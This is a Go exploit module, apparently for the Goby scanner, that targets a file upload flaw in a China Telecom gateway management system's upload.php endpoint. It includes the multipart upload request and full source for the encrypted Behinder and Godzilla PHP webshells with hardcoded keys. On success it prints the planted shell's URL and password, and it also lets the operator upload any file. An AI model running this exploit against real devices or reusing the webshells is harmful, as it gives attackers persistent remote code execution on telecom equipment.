package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Telecom system /manager/teletext/material/upload.php fileupload vulnerability",
    "Description": "<p>China Telecom Group Co., Ltd. (English name \"China Telecom\", referred to as \"China Telecom\") was established in September 2000. It is a large state-owned telecommunications company in China and a global partner of the Shanghai World Expo.</p><p>There is a file upload vulnerability in the background of the telecom gateway configuration management system. An attacker can exploit this vulnerability to obtain a device shell.</p>",
    "Product": "telecom-gateway",
    "Homepage": "http://www.chinatelecom.com.cn/",
    "DisclosureDate": "2023-06-07",
    "Author": "mayi",
    "FofaQuery": "body=\"img/login_bg3.png\" && body=\"系统登录\"",
    "GobyQuery": "body=\"img/login_bg3.png\" && body=\"系统登录\"",
    "Level": "3",
    "Impact": "<p>China Telecom Group Co., Ltd. (English name \"China Telecom\", referred to as \"China Telecom\") was established in September 2000. It is a large state-owned telecommunications company in China and a global partner of the Shanghai World Expo.</p><p>There is a file upload vulnerability in the background of the telecom gateway configuration management system. An attacker can exploit this vulnerability to obtain a device shell.</p>",
    "Recommendation": "<p>The manufacturer has not yet provided a bug fix solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.chinatelecom.com.cn/\">http://www.chinatelecom.com.cn/</a></p>",
    "References": [
        "https://cn-sec.com/archives/1786350.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "fsdfsdfsdf.php",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<?php print(md5(233));",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "电信网关配置管理系统后台 /manager/teletext/material/upload.php 文件上传漏洞",
            "Product": "telecom-gateway",
            "Description": "<p>中国电信集团有限公司（英文名称“China Telecom”、简称“中国电信”）成立于2000年9月，是中国特大型国有通信企业、上海世博会全球合作伙伴。&nbsp;</p><p>电信网关配置管理系统后台 /manager/teletext/material/upload.php 存在文件上传漏洞，攻击者可以利用文件上传漏洞获取系统权限。</p>",
            "Recommendation": "<p>厂家尚未发布修复补丁，请及时关注厂商更新补丁：<a href=\"http://www.chinatelecom.com.cn/\">http://www.chinatelecom.com.cn/</a></p>",
            "Impact": "<p>电信网关配置管理系统后台存在文件上传漏洞，攻击者可以利用文件上传漏洞获取系统权限。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Telecom system /manager/teletext/material/upload.php fileupload vulnerability",
            "Product": "telecom-gateway",
            "Description": "<p>China Telecom Group Co., Ltd. (English name \"China Telecom\", referred to as \"China Telecom\") was established in September 2000. It is a large state-owned telecommunications company in China and a global partner of the Shanghai World Expo.</p><p>There is a file upload vulnerability in the background of the telecom gateway configuration management system. An attacker can exploit this vulnerability to obtain a device shell.</p>",
            "Recommendation": "<p>The manufacturer has not yet provided a bug fix solution, please pay attention to the manufacturer's homepage for timely updates:&nbsp;<a href=\"http://www.chinatelecom.com.cn/\">http://www.chinatelecom.com.cn/</a></p>",
            "Impact": "<p>China Telecom Group Co., Ltd. (English name \"China Telecom\", referred to as \"China Telecom\") was established in September 2000. It is a large state-owned telecommunications company in China and a global partner of the Shanghai World Expo.</p><p>There is a file upload vulnerability in the background of the telecom gateway configuration management system. An attacker can exploit this vulnerability to obtain a device shell.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-06-14",
    "PocId": "10796"
}`

	uploadPhp78058923 := func(u *httpclient.FixUrl, fileName string, fileContent string) (string, error) {
		var err error
		cfgPost := httpclient.NewPostRequestConfig("/manager/teletext/material/upload.php")
		cfgPost.Header.Store("Content-Type", "multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK")
		cfgPost.Header.Store("Cookie", "PHPSESSID=vsdl33qjn3fbslu7k3r99di5n3")
		cfgPost.Header.Store("Upgrade-Insecure-Requests", "1")
		cfgPost.FollowRedirect = false
		cfgPost.VerifyTls = false

		cfgPost.Data = fmt.Sprintf("------WebKitFormBoundaryssh7UfnPpGU7BXfK\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"%s\"\nContent-Type: image/png\n\n%s\n------WebKitFormBoundaryssh7UfnPpGU7BXfK\nContent-Disposition: form-data; name=\"type\"\n\nimg\n------WebKitFormBoundaryssh7UfnPpGU7BXfK\nContent-Disposition: form-data; name=\"w\"\n\n1280\n------WebKitFormBoundaryssh7UfnPpGU7BXfK\nContent-Disposition: form-data; name=\"h\"\n\n720\n------WebKitFormBoundaryssh7UfnPpGU7BXfK\nContent-Disposition: form-data; name=\"userid\"\n\n10003xx\n------WebKitFormBoundaryssh7UfnPpGU7BXfK\nContent-Disposition: form-data; name=\"appid\"\n\n5\n------WebKitFormBoundaryssh7UfnPpGU7BXfK\nContent-Disposition: form-data; name=\"uploadtime\"\n\n\n------WebKitFormBoundaryssh7UfnPpGU7BXfK--", fileName, fileContent)
		if resp, err := httpclient.DoHttpRequest(u, cfgPost); err == nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "ret_msg\":\"success") && strings.Contains(resp.Utf8Html, "material") {
			uploadPhpUrl := regexp.MustCompile(`"ret":0,"ret_msg":"success","url":"(.*)"`).FindStringSubmatch(resp.Utf8Html)[1]
			return uploadPhpUrl, nil
		}
		return "", err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			fileContent := "<?php print(md5(233));unlink(__FILE__);"
			checkStr := goutils.RandomHexString(4)
			fileName := checkStr + ".php"
			uploadPhpUrl, err := uploadPhp78058923(u, fileName, fileContent)
			uploadPhpUrl = strings.Replace(uploadPhpUrl, "\\/", "/", -1)
			if err != nil {
				return false
			}
			getRequestConfig := httpclient.NewGetRequestConfig(uploadPhpUrl)
			getRequestConfig.FollowRedirect = false
			getRequestConfig.VerifyTls = false
			rsp, err := httpclient.DoHttpRequest(u, getRequestConfig)
			if err != nil {
				return true
			} else {
				return strings.Contains(rsp.Utf8Html, "e165421110ba03099a1c0393373c5")
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			var filename, content string
			webshell := goutils.B2S(ss.Params["webshell"])
			if attackType == "webshell" {
				filename = goutils.RandomHexString(4) + ".php"
				if webshell == "behinder" {
					content = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if webshell == "godzilla" {
					content = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				}
			} else if attackType == "custom" {
				filename = goutils.B2S(ss.Params["filename"])
				content = goutils.B2S(ss.Params["content"])
			} else {
				expResult.Success = false
				expResult.Output = "利用方式不存在"
				return expResult
			}
			uploadPhpUrl, err := uploadPhp78058923(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			uploadPhpUrl = strings.Replace(uploadPhpUrl, "\\/", "/", -1)

			getRequestConfig := httpclient.NewGetRequestConfig(uploadPhpUrl)
			getRequestConfig.FollowRedirect = false
			getRequestConfig.VerifyTls = false
			rsp, err := httpclient.DoHttpRequest(expResult.HostInfo, getRequestConfig)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				if rsp.StatusCode == 404 {
					expResult.Success = false
					expResult.Output = "文件上传失败"
				} else {
					expResult.Success = true
					expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + uploadPhpUrl + "\n"
					if attackType != "custom" && webshell == "behinder" {
						expResult.Output += "Password: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					} else if attackType != "custom" && webshell == "godzilla" {
						expResult.Output += "Password: pass 加密器：PHP_XOR_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					}
					expResult.Output += "Webshell type: php"
				}
			}
			return expResult
		},
	))
}
